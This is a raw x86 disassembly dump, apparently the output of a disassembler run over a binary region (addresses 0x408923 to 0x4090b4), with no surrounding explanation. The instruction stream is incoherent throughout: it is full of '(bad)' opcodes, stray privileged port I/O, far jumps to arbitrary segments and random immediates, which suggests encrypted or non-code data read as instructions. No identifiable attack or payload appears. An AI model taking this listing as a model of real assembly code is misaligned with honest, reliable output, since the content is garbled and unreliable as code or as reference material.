  408923:	push   esp
  408924:	sub    BYTE PTR [esi+0x1f4686f4],dl
  40892a:	mov    bh,0xc8
  40892c:	pop    esp
  40892d:	inc    ebx
  40892e:	out    0x22,al
  408930:	mov    al,0x99
  408932:	xchg   esi,eax
  408933:	sar    ebx,1
  408935:	test   eax,0xa93ffa8f
  40893a:	or     ebp,DWORD PTR [eax+0x351af007]
  408940:	(bad)  
  408941:	dec    eax
  408942:	retf   
  408943:	hlt    
  408944:	and    bh,BYTE PTR [ebp+0x7a]
  408947:	call   DWORD PTR [eax+edi*4-0x5d]
  40894b:	mov    eax,ds:0x332da2a8
  408950:	xchg   esi,eax
  408951:	sub    dl,bh
  408953:	mov    al,0xc8
  408955:	pushf  
  408956:	mov    esi,0x60fc7775
  40895b:	xor    DWORD PTR [ebp+0x79549e34],0xa0a02492
  408965:	jne    0x4089af
  408967:	and    BYTE PTR [edi],ah
  408969:	mov    cl,0x64
  40896b:	mov    al,0x9e
  40896d:	pop    edx
  40896e:	push   eax
  40896f:	int3   
  408970:	jne    0x4089a2
  408972:	dec    ecx
  408973:	mov    WORD PTR [edi+0x55270b7d],?
  408979:	push   es
  40897a:	loopne 0x40890f
  40897c:	and    ebx,DWORD PTR [ebp+0x650f1227]
  408982:	cmc    
  408983:	ror    BYTE PTR [eax+ebx*2],0x98
  408987:	add    eax,DWORD PTR [edx+0x7a9d9eeb]
  40898d:	fbstp  TBYTE PTR [eax-0x49]
  408990:	pop    ebx
  408991:	and    al,0xaa
  408993:	in     eax,0x81
  408995:	xchg   ebx,eax
  408996:	pop    esi
  408997:	fldcw  WORD PTR [ebx-0x122aef29]
  40899d:	lods   al,BYTE PTR ds:[esi]
  40899e:	mul    BYTE PTR [esi]
  4089a0:	shl    DWORD PTR [ebp+0x1a],0x45
  4089a4:	aaa    
  4089a5:	sbb    DWORD PTR [edx-0x49],0x3a541028
  4089ac:	dec    esp
  4089ad:	mov    edi,0x1284871d
  4089b2:	push   edx
  4089b3:	(bad)  
  4089b4:	sahf   
  4089b5:	(bad)  
  4089b6:	addr16 push ebx
  4089b8:	scas   al,BYTE PTR es:[edi]
  4089b9:	add    DWORD PTR [edi+esi*4+0x71],edx
  4089bd:	push   0xce6ab2ec
  4089c2:	aaa    
  4089c3:	mov    bh,0xec
  4089c5:	hlt    
  4089c6:	sbb    al,0x96
  4089c8:	jnp    0x40896d
  4089ca:	mov    ds:0x2f76e423,eax
  4089cf:	cmp    edx,eax
  4089d1:	shr    BYTE PTR [esi+0x56],0xb
  4089d5:	outs   dx,DWORD PTR cs:[esi]
  4089d7:	sahf   
  4089d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089d9:	adc    DWORD PTR [edi],ecx
  4089db:	shl    DWORD PTR [esi+0x1e640d66],0xed
  4089e2:	lock call 0xa987:0xdd6b1bd2
  4089ea:	xchg   esp,eax
  4089eb:	push   0x3d
  4089ed:	les    edx,FWORD PTR [edx]
  4089ef:	inc    edx
  4089f0:	adc    DWORD PTR gs:[edi+0x61],0x74
  4089f5:	pop    es
  4089f6:	adc    BYTE PTR [eax+0x39],dh
  4089f9:	fadd   DWORD PTR ds:0x4b83144d
  4089ff:	cld    
  408a00:	jbe    0x408a05
  408a02:	sbb    BYTE PTR [ebp+0x151a0760],bl
  408a08:	mov    al,0x74
  408a0a:	loope  0x4089f0
  408a0c:	inc    esi
  408a0d:	addr16 dec bp
  408a10:	push   ebp
  408a11:	xchg   esi,eax
  408a12:	and    ebx,ebp
  408a14:	ficom  DWORD PTR [ebx]
  408a16:	ror    DWORD PTR ss:[ebp+edi*4+0xf49677c],0xbd
  408a1f:	popa   
  408a20:	pop    esp
  408a21:	je     0x4089d0
  408a23:	popf   
  408a24:	stos   BYTE PTR es:[edi],al
  408a25:	shr    DWORD PTR [esi],0x56
  408a28:	iret   
  408a29:	arpl   WORD PTR [ebx-0x18],bx
  408a2c:	gs dec eax
  408a2e:	and    DWORD PTR [ecx+0x37],0xffffffae
  408a32:	sbb    DWORD PTR cs:[eax-0x1deeb38c],esp
  408a39:	in     al,0x59
  408a3b:	test   BYTE PTR [ecx-0x281ee548],dh
  408a41:	inc    esi
  408a42:	mov    ah,0x6b
  408a44:	xor    eax,DWORD PTR [ecx+edx*4-0x7e]
  408a48:	sub    bh,BYTE PTR [eax+edx*1+0x3e]
  408a4c:	or     bh,BYTE PTR [ebx]
  408a4e:	or     ah,dh
  408a50:	inc    edx
  408a51:	pop    edx
  408a52:	imul   ebp,esi,0xfffffffb
  408a55:	pop    edx
  408a56:	in     al,0xee
  408a58:	mov    bh,0xca
  408a5a:	jge    0x408a8b
  408a5c:	or     BYTE PTR [eax+0xffd6c7a],dl
  408a62:	push   ebp
  408a63:	(bad)  
  408a64:	xor    esi,ecx
  408a66:	xor    eax,0x377987f3
  408a6b:	dec    edx
  408a6c:	inc    ebx
  408a6d:	push   edx
  408a6e:	inc    esi
  408a6f:	mov    eax,ds:0xc9959f0
  408a74:	outs   dx,BYTE PTR ds:[esi]
  408a75:	sti    
  408a76:	test   esp,edi
  408a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a79:	dec    edx
  408a7a:	shl    BYTE PTR [ebx-0x79786a55],0x27
  408a81:	repz cdq 
  408a83:	bound  si,DWORD PTR [esi-0x38253b7]
  408a8a:	stc    
  408a8b:	push   es
  408a8c:	xor    eax,0x9c3a8248
  408a91:	push   cs
  408a92:	mov    ebx,ds
  408a94:	fcom   DWORD PTR [edi]
  408a96:	xchg   esp,eax
  408a97:	and    ebp,eax
  408a99:	jmp    0x1031f07f
  408a9e:	shl    DWORD PTR [edi+0x4b86b0d1],0x30
  408aa5:	dec    ecx
  408aa6:	pushf  
  408aa7:	sub    al,BYTE PTR [eax]
  408aa9:	imul   DWORD PTR [ebx+edx*2-0x6e27ffb]
  408ab0:	shl    BYTE PTR [ebp-0x19b71c8e],1
  408ab6:	or     eax,0x95938ca7
  408abb:	mov    ebx,DWORD PTR [eax]
  408abd:	sbb    ecx,DWORD PTR [eax]
  408abf:	pop    esi
  408ac0:	push   eax
  408ac1:	xor    DWORD PTR [ecx+0x77443b82],eax
  408ac7:	popa   
  408ac8:	in     eax,0x41
  408aca:	in     eax,dx
  408acb:	inc    ecx
  408acc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408acd:	ins    DWORD PTR es:[edi],dx
  408ace:	cmc    
  408acf:	dec    esi
  408ad0:	push   esp
  408ad1:	add    al,0x55
  408ad3:	out    dx,al
  408ad4:	fcomp  QWORD PTR [edi+ebx*8+0x383473d2]
  408adb:	inc    ebp
  408adc:	cmp    ecx,DWORD PTR [esi]
  408ade:	cmp    bl,bl
  408ae0:	xchg   DWORD PTR [ebx+0x73c0e287],eax
  408ae6:	dec    ebp
  408ae7:	and    ebp,esi
  408ae9:	pop    ds
  408aea:	sub    esp,DWORD PTR [esi+0x2d]
  408aed:	cmp    eax,0xc2a83680
  408af2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408af3:	inc    edi
  408af4:	fcomp  DWORD PTR [edx]
  408af6:	push   cs
  408af7:	sbb    eax,0x9d990d72
  408afc:	xchg   ebx,eax
  408afd:	sbb    edx,DWORD PTR [ecx]
  408aff:	mov    bh,0x95
  408b01:	xchg   bh,ch
  408b03:	mov    esi,0x46e92c9f
  408b08:	cmp    BYTE PTR [esi+ebp*8-0x47ca51de],cl
  408b0f:	jecxz  0x408b1e
  408b11:	dec    esi
  408b12:	sub    BYTE PTR [edi-0x1e8afef6],0xc4
  408b19:	mov    cl,0x73
  408b1b:	and    BYTE PTR [ebp+0x43],dl
  408b1e:	push   0x6
  408b20:	ds int 0x49
  408b23:	xchg   esi,eax
  408b24:	std    
  408b25:	cmp    al,0xcb
  408b27:	stos   DWORD PTR es:[edi],eax
  408b28:	jno    0x408b40
  408b2a:	push   edi
  408b2b:	fdiv   DWORD PTR [ebx-0x173bc55a]
  408b31:	sub    al,0xea
  408b33:	add    BYTE PTR [ebp-0x3],bh
  408b36:	pop    esi
  408b37:	xor    esp,DWORD PTR [ecx]
  408b39:	retf   
  408b3a:	xchg   ecx,eax
  408b3b:	mov    dh,0x41
  408b3d:	outs   dx,DWORD PTR ds:[esi]
  408b3e:	ins    DWORD PTR es:[edi],dx
  408b3f:	fsubr  st,st(7)
  408b41:	stos   BYTE PTR es:[edi],al
  408b42:	js     0x408b8e
  408b44:	xchg   edx,eax
  408b45:	adc    ebx,DWORD PTR [esi+0x4704ac49]
  408b4b:	push   0xfffffff7
  408b4d:	lahf   
  408b4e:	aas    
  408b4f:	xchg   esi,eax
  408b50:	out    dx,al
  408b51:	rcl    BYTE PTR [ebx-0x74],cl
  408b54:	stos   DWORD PTR es:[edi],eax
  408b55:	push   ebx
  408b56:	cmp    eax,0x290451bd
  408b5b:	idiv   BYTE PTR [edi+0x2d0edb21]
  408b61:	mov    dl,0xac
  408b63:	and    eax,0xb287b030
  408b68:	and    eax,0xaadbfb7e
  408b6d:	data16 shl al,1
  408b70:	rol    DWORD PTR [ebx+0x0],cl
  408b73:	push   es
  408b74:	jae    0x408b99
  408b76:	xchg   ebx,eax
  408b77:	in     al,dx
  408b78:	aam    0x5a
  408b7a:	push   ebp
  408b7b:	xor    al,0xa3
  408b7d:	cmp    BYTE PTR [esi-0x1ed7de31],dh
  408b83:	xchg   edi,eax
  408b84:	out    0x9a,al
  408b86:	fnstcw WORD PTR [esi+0x427bf9c6]
  408b8c:	sbb    BYTE PTR [eax+0x3e],al
  408b8f:	adc    DWORD PTR [esp+edi*8-0x27fc2114],ecx
  408b96:	or     esp,DWORD PTR [ebp+0x55b86eb5]
  408b9c:	mov    ebx,ebx
  408b9e:	stos   DWORD PTR es:[edi],eax
  408b9f:	bound  eax,QWORD PTR [edi]
  408ba1:	cmp    bl,dh
  408ba3:	xor    al,0xef
  408ba5:	stc    
  408ba6:	lods   eax,DWORD PTR ds:[esi]
  408ba7:	adc    ecx,ecx
  408ba9:	inc    ecx
  408baa:	ds mov eax,esi
  408bad:	inc    esi
  408bae:	repz xor bl,cl
  408bb1:	popa   
  408bb2:	les    ebp,FWORD PTR [esi]
  408bb4:	imul   ebp,DWORD PTR [edi+0x40],0x3c
  408bb8:	out    dx,al
  408bb9:	mov    dh,0x7b
  408bbb:	xor    dh,BYTE PTR [ebp+0x45]
  408bbe:	push   esi
  408bbf:	dec    ecx
  408bc0:	push   cs
  408bc1:	pop    es
  408bc2:	cmp    DWORD PTR [ecx-0x4],ecx
  408bc5:	mul    DWORD PTR [edi+0x3e]
  408bc8:	or     BYTE PTR [edx],bh
  408bca:	inc    esp
  408bcb:	jmp    0xe881:0xc87efe45
  408bd2:	and    cl,bh
  408bd4:	jg     0x408c41
  408bd6:	sbb    ch,BYTE PTR [esi]
  408bd8:	daa    
  408bd9:	dec    BYTE PTR [edx+0x3b]
  408bdc:	scas   eax,DWORD PTR es:[edi]
  408bdd:	ror    DWORD PTR [ebp+0x3b],0xe
  408be1:	fdivr  DWORD PTR [edi-0x10]
  408be4:	popf   
  408be5:	adc    dl,BYTE PTR [ecx]
  408be7:	jg     0x408bd5
  408be9:	pop    esp
  408bea:	hlt    
  408beb:	mov    bh,0x2d
  408bed:	sbb    BYTE PTR [ebp+0x1f],bh
  408bf0:	fistp  QWORD PTR [esi+ecx*8+0x1df783d4]
  408bf7:	mov    edi,0xa7631b8a
  408bfc:	jmp    DWORD PTR [edx-0xe]
  408bff:	push   edx
  408c00:	aas    
  408c01:	or     eax,0xd348c585
  408c06:	pop    ss
  408c07:	cdq    
  408c08:	call   0xb10c542e
  408c0d:	sub    DWORD PTR [ebx],esi
  408c0f:	fld    QWORD PTR [edi+0x58]
  408c12:	and    al,0xc
  408c14:	lahf   
  408c15:	dec    ebx
  408c16:	lds    ebx,FWORD PTR [ebx+0x6b]
  408c19:	ds jno 0x408bd0
  408c1c:	mov    DWORD PTR [eax+0x74],esi
  408c1f:	pop    ds
  408c20:	jecxz  0x408c0b
  408c22:	into   
  408c23:	ret    0xb2b2
  408c26:	or     DWORD PTR [edi+ecx*1],esi
  408c29:	mov    ch,BYTE PTR [edx+0x1b]
  408c2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c2d:	jae    0x408c34
  408c2f:	sti    
  408c30:	lods   eax,DWORD PTR ds:[esi]
  408c31:	jo     0x408c8d
  408c33:	jo     0x408c83
  408c35:	pop    es
  408c36:	sub    al,ah
  408c38:	leave  
  408c39:	push   cs
  408c3a:	and    DWORD PTR [esi],esi
  408c3c:	out    dx,eax
  408c3d:	es or  al,0x3e
  408c40:	mov    ds:0xd6dcf411,eax
  408c45:	test   al,0x3
  408c47:	cmp    esi,esi
  408c49:	sbb    DWORD PTR [edi-0x7e],ebp
  408c4c:	popf   
  408c4d:	sub    ch,BYTE PTR fs:[eax]
  408c50:	mov    DWORD PTR [eax+ebx*2+0x2631635],edi
  408c57:	ss jge 0x408bea
  408c5a:	call   0xa013:0x2aa5dc66
  408c61:	mov    cl,0x4f
  408c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c64:	imul   esp,DWORD PTR [esi],0x4a
  408c67:	shl    DWORD PTR [esi-0x6a31f961],cl
  408c6d:	stc    
  408c6e:	ror    DWORD PTR [ecx-0x1cd5f521],0x4c
  408c75:	les    edi,FWORD PTR [edi-0x63]
  408c78:	test   DWORD PTR [esi],ecx
  408c7a:	out    dx,al
  408c7b:	cdq    
  408c7c:	adc    DWORD PTR [edx+0x7c],0xcffe9954
  408c83:	sub    ebp,edx
  408c85:	jbe    0x408c46
  408c87:	sub    BYTE PTR [eax+0x3243cf97],al
  408c8d:	xlat   BYTE PTR ds:[ebx]
  408c8e:	add    dh,BYTE PTR [ebx-0x18bdd7d9]
  408c94:	idiv   DWORD PTR [ebx+0xd]
  408c97:	mov    ds:0xbaa084f9,al
  408c9c:	sti    
  408c9d:	or     dh,BYTE PTR [ecx+eiz*1+0x4c]
  408ca1:	jnp    0x408c57
  408ca3:	lods   al,BYTE PTR ds:[esi]
  408ca4:	outs   dx,DWORD PTR ds:[esi]
  408ca5:	pop    esp
  408ca6:	cmp    BYTE PTR [ebx],ch
  408ca8:	jl     0x408caa
  408caa:	mov    ds:0xffb4a7ec,al
  408caf:	dec    esp
  408cb0:	pop    ecx
  408cb1:	stc    
  408cb2:	fsubr  st,st(3)
  408cb4:	mov    esi,0xd712c5ff
  408cb9:	jns    0x408c83
  408cbb:	sbb    ebp,DWORD PTR [esi+eiz*2]
  408cbe:	rcl    BYTE PTR [eax+0x2f3b86e2],0xf8
  408cc5:	je     0x408c8d
  408cc7:	pop    edx
  408cc8:	and    al,0x97
  408cca:	jge    0x408d15
  408ccc:	ret    0xfbd6
  408ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cd0:	cmc    
  408cd1:	mov    dh,0x39
  408cd3:	mov    ds:0x21484ac3,al
  408cd8:	cmp    eax,0x5be4662f
  408cdd:	push   0xffffffec
  408cdf:	mov    al,ds:0xbad15d0c
  408ce4:	add    al,0xe4
  408ce6:	mov    ecx,0x75d23f40
  408ceb:	pop    es
  408cec:	int3   
  408ced:	retf   0x7d38
  408cf0:	lds    ebp,FWORD PTR [esi-0x2db81fdf]
  408cf6:	pop    edi
  408cf7:	or     eax,0x185f27d5
  408cfc:	mov    BYTE PTR [edx+0x2f3e84be],ch
  408d02:	sub    eax,0xdc9697c2
  408d07:	push   ecx
  408d08:	fwait
  408d09:	ret    
  408d0a:	jb     0x408d2d
  408d0c:	mov    DWORD PTR [eax+0x7b7d9abd],esi
  408d12:	fwait
  408d13:	xor    BYTE PTR [ebp+esi*2+0x75],cl
  408d17:	push   esi
  408d18:	mov    BYTE PTR [ebx-0x4f],al
  408d1b:	push   esp
  408d1c:	stos   DWORD PTR es:[edi],eax
  408d1d:	push   esp
  408d1e:	pop    esi
  408d1f:	sbb    eax,0x5354e474
  408d24:	fld    DWORD PTR [ebx+ebp*4-0x1a]
  408d28:	fdiv   DWORD PTR [ecx-0x61]
  408d2b:	bound  ebp,QWORD PTR [esi+ecx*2]
  408d2e:	inc    ebx
  408d2f:	adc    dl,ch
  408d31:	ins    DWORD PTR es:[edi],dx
  408d32:	jnp    0x408d83
  408d34:	fdiv   st,st(1)
  408d36:	pop    ds
  408d37:	pop    eax
  408d38:	pop    eax
  408d39:	push   edi
  408d3a:	lock jb 0x408d51
  408d3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d3e:	pop    eax
  408d3f:	sub    al,0x88
  408d41:	test   al,dh
  408d43:	add    eax,0x387e29bd
  408d48:	mov    al,ds:0xb21d5f6f
  408d4d:	(bad)  
  408d4e:	jmp    0x408d78
  408d50:	add    eax,0xdacf4345
  408d55:	add    BYTE PTR [edi-0x56],cl
  408d58:	sub    BYTE PTR [edi+0x0],bl
  408d5b:	les    ebp,FWORD PTR [ecx]
  408d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d5e:	push   esp
  408d5f:	sahf   
  408d60:	inc    ebp
  408d61:	(bad)
  408d64:	es dec esi
  408d66:	std    
  408d67:	pop    edi
  408d68:	rcr    DWORD PTR ds:0xe08429da,0x2
  408d6f:	add    dh,ah
  408d71:	push   edx
  408d72:	ret    
  408d73:	jecxz  0x408d77
  408d75:	inc    esi
  408d76:	data16 and BYTE PTR [esi-0x6902c35a],cl
  408d7d:	test   al,0xb8
  408d7f:	xor    DWORD PTR [edx],ebx
  408d81:	jbe    0x408d98
  408d83:	and    DWORD PTR [edi-0x4e78bb9e],esi
  408d89:	shr    DWORD PTR [ebx],0xda
  408d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d8d:	xchg   edx,eax
  408d8e:	xchg   esp,eax
  408d8f:	mov    esp,0xd7d5e4e5
  408d94:	xchg   DWORD PTR [edi-0x409b3433],esp
  408d9a:	mov    bh,0xec
  408d9c:	call   0x76420e77
  408da1:	call   0xe0b7:0x49c732d5
  408da8:	(bad)  
  408da9:	xor    ah,BYTE PTR ds:0x6f6e4154
  408daf:	aaa    
  408db0:	fidivr DWORD PTR [eax-0x13]
  408db3:	mov    dl,0x6e
  408db5:	xor    bl,BYTE PTR [edi-0x27]
  408db8:	ficomp DWORD PTR [esi]
  408dba:	mov    ch,0x36
  408dbc:	(bad)  
  408dbd:	ss stos BYTE PTR es:[edi],al
  408dbf:	and    BYTE PTR [edi-0x77],bh
  408dc2:	jge    0x408d93
  408dc4:	mov    dl,0x1
  408dc6:	pop    ecx
  408dc7:	or     DWORD PTR ds:0xde833c9,esi
  408dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dce:	pop    edx
  408dcf:	loope  0x408d79
  408dd1:	mov    BYTE PTR [esi],cl
  408dd3:	outs   dx,BYTE PTR ds:[esi]
  408dd4:	scas   al,BYTE PTR es:[edi]
  408dd5:	lods   eax,DWORD PTR ds:[esi]
  408dd6:	mov    eax,0xda726e2
  408ddb:	into   
  408ddc:	stc    
  408ddd:	cmp    ch,BYTE PTR [ebx]
  408ddf:	mov    dl,0x8f
  408de1:	int3   
  408de2:	pop    es
  408de3:	imul   ebp,DWORD PTR [esi+0x680b64cc],0x68
  408dea:	in     al,0x7b
  408dec:	jbe    0x408da6
  408dee:	out    dx,eax
  408def:	xchg   ecx,eax
  408df0:	sub    ecx,DWORD PTR [edx+0x5c]
  408df3:	lea    ecx,[ebx]
  408df5:	retfw  
  408df7:	jne    0x408e54
  408df9:	jp     0x408d9f
  408dfb:	(bad)  
  408dfc:	adc    bl,dh
  408dfe:	ss aas 
  408e00:	daa    
  408e01:	imul   ecx,DWORD PTR [ebp-0x30758a9d],0xc27fadeb
  408e0b:	xchg   ecx,eax
  408e0c:	adc    DWORD PTR [edi],0x54a6c7b3
  408e12:	ins    BYTE PTR es:[edi],dx
  408e13:	jo     0x408e72
  408e15:	mov    ebp,0x107762ce
  408e1a:	das    
  408e1b:	test   al,0x34
  408e1d:	sbb    cl,ah
  408e1f:	jmp    0xd56971bc
  408e24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e25:	and    DWORD PTR [ecx],0x65
  408e28:	sub    eax,DWORD PTR [ebp-0x24aa125a]
  408e2e:	xor    eax,0x66c0a7ca
  408e33:	inc    ebx
  408e34:	and    eax,0x63fed8e5
  408e39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e3b:	mov    BYTE PTR [edx+ebx*4-0x53667bee],al
  408e42:	cmp    BYTE PTR [edi],bl
  408e44:	mov    BYTE PTR [ecx+0x19ac2e6b],bh
  408e4a:	sbb    ah,BYTE PTR [ebp-0x31]
  408e4d:	xor    dl,cl
  408e4f:	cli    
  408e50:	add    esp,DWORD PTR [eax+0x2edbdcb6]
  408e56:	xchg   edi,eax
  408e57:	mov    bl,BYTE PTR [ecx+0x6]
  408e5a:	int    0xce
  408e5c:	dec    eax
  408e5d:	sbb    eax,0x9f9b423d
  408e62:	adc    ecx,DWORD PTR [edx+0x1d]
  408e65:	or     eax,0xe114f701
  408e6a:	push   edx
  408e6b:	mov    ebx,0x61b5f1ec
  408e70:	dec    esp
  408e71:	mov    bl,0x7f
  408e73:	mov    ecx,0x7e3285ca
  408e78:	xlat   BYTE PTR ds:[ebx]
  408e79:	and    BYTE PTR [edx-0xd],0xec
  408e7d:	mov    bl,0x42
  408e7f:	lahf   
  408e80:	mov    ds:0xddb3c425,al
  408e85:	xchg   BYTE PTR [eax-0x4e],dl
  408e88:	test   eax,0xeb9ebc98
  408e8d:	inc    esi
  408e8e:	jmp    0xae1:0xc20a77f3
  408e95:	pop    ss
  408e96:	imul   esi,DWORD PTR [esi+0x1e491ab7],0xb6416dd0
  408ea0:	data16 out 0x3f,al
  408ea3:	dec    eax
  408ea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ea5:	sbb    BYTE PTR [esi],0x2f
  408ea8:	popf   
  408ea9:	popa   
  408eaa:	mov    al,ds:0x950a4bd8
  408eaf:	jmp    0x22cc73f7
  408eb4:	xchg   esp,eax
  408eb5:	test   BYTE PTR [edi],ch
  408eb7:	in     eax,0x28
  408eb9:	push   cs
  408eba:	aaa    
  408ebb:	shr    BYTE PTR [ebx-0x4e],cl
  408ebe:	pushf  
  408ebf:	jno    0x408ea0
  408ec1:	adc    eax,0xc3bd4930
  408ec6:	inc    ebp
  408ec7:	pop    edi
  408ec8:	sar    BYTE PTR [edi+esi*1+0x63],1
  408ecc:	push   ss
  408ecd:	sbb    bl,ch
  408ecf:	jge    0x408ec2
  408ed1:	or     esi,DWORD PTR [ecx+0x54]
  408ed4:	aaa    
  408ed5:	test   BYTE PTR ds:0xcf9c4920,dl
  408edb:	sbb    DWORD PTR [edi-0x1fcda753],esp
  408ee1:	sbb    DWORD PTR [ebp+0x6f],ebx
  408ee4:	push   edi
  408ee5:	ret    0x8573
  408ee8:	mov    ch,BYTE PTR [ebx]
  408eea:	push   edi
  408eeb:	es ins BYTE PTR es:[edi],dx
  408eed:	out    0x66,al
  408eef:	faddp  st(0),st
  408ef1:	ins    DWORD PTR es:[edi],dx
  408ef2:	lea    edx,[edx+0x4]
  408ef5:	dec    esp
  408ef6:	cmp    dh,BYTE PTR [ebx-0x216808f0]
  408efc:	data16 jp 0x408e91
  408eff:	stos   BYTE PTR es:[edi],al
  408f00:	(bad)  
  408f01:	test   al,0x26
  408f03:	xchg   ebx,eax
  408f04:	imul   DWORD PTR [ebx-0x6c]
  408f07:	ror    edx,0x27
  408f0a:	fiadd  WORD PTR [ecx+0x73]
  408f0d:	jae    0x408f8a
  408f0f:	cdq    
  408f10:	jl     0x408ed7
  408f12:	jecxz  0x408f4a
  408f14:	aad    0x10
  408f16:	leave  
  408f17:	clc    
  408f18:	(bad)  
  408f19:	or     eax,0x62340799
  408f1e:	fsub   DWORD PTR [edx-0x7a]
  408f21:	cmp    al,0x42
  408f23:	ds cmp al,0x6d
  408f26:	fisubr DWORD PTR [ecx-0x5889e609]
  408f2c:	jecxz  0x408f8f
  408f2e:	jecxz  0x408f63
  408f30:	sbb    ecx,DWORD PTR [ecx+0x13]
  408f33:	push   0xb1e08273
  408f38:	les    eax,FWORD PTR [edx]
  408f3a:	mov    ds,WORD PTR [edi+0x2db6036a]
  408f40:	fist   DWORD PTR [edx-0x20]
  408f43:	cmp    al,0xe2
  408f45:	pop    ss
  408f46:	ins    BYTE PTR es:[edi],dx
  408f47:	in     al,dx
  408f48:	dec    ebp
  408f49:	push   0xe66965d6
  408f4e:	mov    bh,0x97
  408f50:	pop    es
  408f51:	fsub   DWORD PTR [ebp+0x1e]
  408f54:	pop    esp
  408f55:	call   0xa5ec:0x88349ac7
  408f5c:	cmp    BYTE PTR [ecx-0x66],dh
  408f5f:	ja     0x408f1b
  408f61:	pop    esp
  408f62:	hlt    
  408f63:	adc    al,0x84
  408f65:	fwait
  408f66:	jmp    0x408f59
  408f68:	pop    ds
  408f69:	cld    
  408f6a:	xchg   ebp,eax
  408f6b:	cmp    eax,0x8d94266a
  408f70:	ror    BYTE PTR [ebx-0xe],0x4
  408f74:	cmp    DWORD PTR ss:[esi-0x73],0x5f30ec91
  408f7c:	pop    ss
  408f7d:	out    dx,al
  408f7e:	dec    ebp
  408f7f:	std    
  408f80:	jp     0x408f23
  408f82:	and    BYTE PTR gs:[ebx+0x17512882],cl
  408f89:	xor    DWORD PTR [esi+ecx*2+0x47b6c321],esp
  408f90:	ins    BYTE PTR es:[edi],dx
  408f91:	pop    ecx
  408f92:	ret    
  408f93:	xor    ah,BYTE PTR [eax-0x7cb71707]
  408f99:	xchg   esp,eax
  408f9a:	dec    ebx
  408f9b:	dec    eax
  408f9c:	lahf   
  408f9d:	and    al,0xb5
  408f9f:	mov    ah,ah
  408fa1:	and    BYTE PTR [ebx+0x763e2ad2],bl
  408fa7:	cmp    edi,DWORD PTR [ebx+esi*1+0x7b]
  408fab:	in     al,dx
  408fac:	fs in  al,dx
  408fae:	outs   dx,BYTE PTR ds:[esi]
  408faf:	xchg   esi,eax
  408fb0:	and    eax,0xe1906dc9
  408fb5:	das    
  408fb6:	cmp    al,0xd
  408fb8:	sub    eax,0x6fc51c7f
  408fbd:	pop    ecx
  408fbe:	dec    ebp
  408fbf:	lods   eax,DWORD PTR ds:[esi]
  408fc0:	fimul  WORD PTR [ebp-0x4a]
  408fc3:	(bad)  
  408fc4:	or     al,0x7a
  408fc6:	jge    0x408f4a
  408fc8:	icebp  
  408fc9:	push   edx
  408fca:	mov    esp,0xdec1777e
  408fcf:	int3   
  408fd0:	lods   al,BYTE PTR ds:[esi]
  408fd1:	dec    ecx
  408fd2:	outs   dx,DWORD PTR ds:[esi]
  408fd3:	ins    BYTE PTR es:[edi],dx
  408fd4:	xchg   ebx,eax
  408fd5:	and    edi,ebx
  408fd7:	jne    0x408fd1
  408fd9:	icebp  
  408fda:	push   cs
  408fdb:	inc    edx
  408fdc:	loop   0x409028
  408fde:	inc    ebx
  408fdf:	imul   ebx,DWORD PTR [edx-0x5ae2d65a],0x3b
  408fe6:	mov    edx,0x8606ec8b
  408feb:	(bad)  
  408fed:	jo     0x408fe5
  408fef:	fcmovnbe st,st(0)
  408ff1:	and    dl,0x3f
  408ff4:	pop    esp
  408ff5:	pop    edx
  408ff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ff7:	push   edi
  408ff8:	mov    esi,DWORD PTR [ebp+0x6b5cdc4]
  408ffe:	imul   edx,DWORD PTR [ebx+0x4c],0x8103ee0a
  409005:	jg     0x409003
  409007:	fwait
  409008:	lods   al,BYTE PTR ds:[esi]
  409009:	and    DWORD PTR [eax+edi*1],eax
  40900c:	add    BYTE PTR [ecx],0x5f
  40900f:	add    al,0x1f
  409011:	mov    eax,0x7ef86c23
  409016:	cmp    al,0xf8
  409018:	jmp    0x8a89:0x541f6b59
  40901f:	pop    esi
  409020:	inc    eax
  409021:	shr    DWORD PTR [ebp+0x2bfb2897],cl
  409027:	jnp    0x40902b
  409029:	push   0x61a3ceae
  40902e:	push   cs
  40902f:	and    cl,cl
  409031:	cmp    BYTE PTR [edx],bl
  409033:	(bad)
  409037:	loop   0x408fc7
  409039:	xlat   BYTE PTR ds:[ebx]
  40903a:	retf   0xf3a6
  40903d:	adc    BYTE PTR [ebp-0x500684d1],0x2c
  409044:	or     al,0x91
  409046:	sar    DWORD PTR [ebx-0x5a],1
  409049:	js     0x40905e
  40904b:	cs or  esp,eax
  40904e:	mul    DWORD PTR [ebx-0x4f8db755]
  409054:	mov    ds:0x57135af,al
  409059:	sbb    eax,0xc8c2d6d5
  40905e:	jnp    0x409034
  409060:	test   BYTE PTR [ecx+0x148b525e],ch
  409066:	jns    0x40907a
  409068:	xor    al,0xe2
  40906a:	and    DWORD PTR [ecx+0x6886c7ee],0x28f3fd8b
  409074:	dec    edx
  409075:	clc    
  409076:	call   0x4d2a:0xb3db4edd
  40907d:	shl    bl,cl
  40907f:	cmp    esi,DWORD PTR [eax+0x32319332]
  409085:	in     al,0x1e
  409087:	and    ch,BYTE PTR [edx-0xa74e38b]
  40908d:	popf   
  40908e:	add    edi,DWORD PTR [edx+0x4de8fc9b]
  409094:	sub    BYTE PTR [edx+eiz*1-0x40],0x4f
  409099:	push   ebx
  40909a:	int3   
  40909b:	lds    esi,FWORD PTR [edi+0x475da24c]
  4090a1:	repz loopne 0x4090c9
  4090a4:	push   eax
  4090a5:	fistp  QWORD PTR [esp+edx*1]
  4090a8:	mov    esi,0x87104724
  4090ad:	jo     0x40911e
  4090af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090b0:	loop   0x4090d4
  4090b2:	jns    0x40904c
  4090b4:	jno    0x4090e5
